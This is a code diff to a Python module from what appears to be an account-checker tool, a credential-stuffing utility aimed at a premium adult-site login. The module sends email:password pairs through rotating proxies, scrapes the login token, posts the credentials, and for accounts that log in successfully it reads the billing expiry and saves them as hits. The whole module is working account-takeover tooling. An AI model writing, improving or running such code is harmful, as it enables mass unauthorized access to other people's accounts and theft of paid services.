@@ -1,11 +1,13 @@
-from __main__ import checker
+from modules.variables import Checker
 from modules.functions import set_proxy, log, save, bad_proxy
 from requests import Session
 
 def check(email:str,password:str):
     retries = 0
-    while retries != checker.retries:   
+    while retries != Checker.retries:   
         proxy = set_proxy()
+        proxy_set = set_proxy(proxy)
+
         headers = {
             "Content-Type":"application/x-www-form-urlencoded",
             "Host": "www.pornhubpremium.com" ,
@@ -22,34 +24,34 @@ def check(email:str,password:str):
         data = "username={}&password={}&token={}&redirect=&from=pc_premium_login&segment=straight"
         try:
             with Session() as s:
-                token = s.get("https://www.pornhubpremium.com/premium/login",proxies=set_proxy(proxy),timeout=checker.timeout).text.split("<input type=\"hidden\" name=\"token\" id=\"token\" value=\"")[1].split("\" />")[0]
-                response = s.post("https://www.pornhubpremium.com/front/authenticate",headers=headers,data=data.format(email,password,token),proxies=set_proxy(proxy),timeout=checker.timeout).text
+                token = s.get("https://www.pornhubpremium.com/premium/login",proxies=proxy_set,timeout=Checker.timeout).text.split("<input type=\"hidden\" name=\"token\" id=\"token\" value=\"")[1].split("\" />")[0]
+                response = s.post("https://www.pornhubpremium.com/front/authenticate",headers=headers,data=data.format(email,password,token),proxies=proxy_set,timeout=Checker.timeout).text
                 if "success\":\"0\",\"" in response:
                     retries += 1
                 elif "success\":\"1\",\"" in response:
-                    plan = s.get("https://www.pornhubpremium.com/user/manage/start",proxies=set_proxy(proxy),timeout=checker.timeout).text
+                    plan = s.get("https://www.pornhubpremium.com/user/manage/start",proxies=proxy_set,timeout=Checker.timeout).text
                     if "Next Billing Date" in plan:
                         expiry = plan.split("p id=\"expiryDatePremium\">Next Billing Date ")[1].split("</date></p>")[0]
-                        if not checker.cui:
+                        if not Checker.cui:
                             log("good",email+":"+password+f" | Expire: {expiry}","Pornhub")
-                        save("Pornhub","good",checker.time,email+":"+password+f" | Expire: {expiry}")
-                        checker.good += 1
-                        checker.cpm += 1
+                        save("Pornhub","good",Checker.time,email+":"+password+f" | Expire: {expiry}")
+                        Checker.good += 1
+                        Checker.cpm += 1
                         return
                     else:
-                        if not checker.cui:
+                        if not Checker.cui:
                             log("custom",email+":"+password,"Pornhub")
-                        save("Pornhub","custom",checker.time,email+":"+password)
-                        checker.custom += 1
-                        checker.cpm += 1
+                        save("Pornhub","custom",Checker.time,email+":"+password)
+                        Checker.custom += 1
+                        Checker.cpm += 1
                         return
                 else:
                     raise
         except:
             bad_proxy(proxy)
-            checker.errors += 1
-    if not checker.cui:
+            Checker.errors += 1
+    if not Checker.cui:
         log("bad",email+":"+password,"Pornhub")
-    checker.bad += 1
-    checker.cpm += 1
+    Checker.bad += 1
+    Checker.cpm += 1
     return
